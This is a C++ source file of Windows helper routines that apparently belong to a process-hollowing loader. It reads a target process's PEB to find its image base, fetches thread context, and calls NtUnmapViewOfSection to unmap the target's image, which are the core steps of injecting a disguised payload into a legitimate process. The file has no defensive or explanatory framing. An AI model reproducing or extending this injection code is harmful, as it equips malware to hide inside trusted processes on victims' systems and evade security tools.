#include "utils.h"

inline DWORD64 Utils::Error(const std::string& errMsg) {
	std::cout << "[-] " << errMsg << ":" << GetLastError() << "\n";
	return EXIT_FAILURE;
}

BOOL Utils::getContext(HANDLE hThread, CONTEXT &ctx) {
	return GetThreadContext(hThread, &ctx);
}


std::optional<LPVOID> Utils::readProcessMemory(HANDLE hProcess, DWORD64 pebAddr) {
	DWORD64 imageBaseP = (DWORD64)pebAddr + 16;
	LPVOID imageBaseAddr = NULL;
	if (!ReadProcessMemory(hProcess, (LPCVOID)imageBaseP, &imageBaseAddr, sizeof(DWORD64), NULL)) {
		Utils::Error("Failed read process memory");
		return std::nullopt;
	}
	return (LPVOID)imageBaseAddr;

}

DWORD64 Utils::unmapProcess(HMODULE dll, HANDLE hProcess, LPVOID imageBaseAddr) {
	pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(dll, "NtUnmapViewOfSection");
	if (!NtUnmapViewOfSection) {
		return Utils::Error("Failed find function NtUnmapViewOfSection");
	}

	if (!NT_SUCCESS(NtUnmapViewOfSection(hProcess, imageBaseAddr))) {
		return Utils::Error("Failed unmap process");
	}
	return EXIT_SUCCESS;
}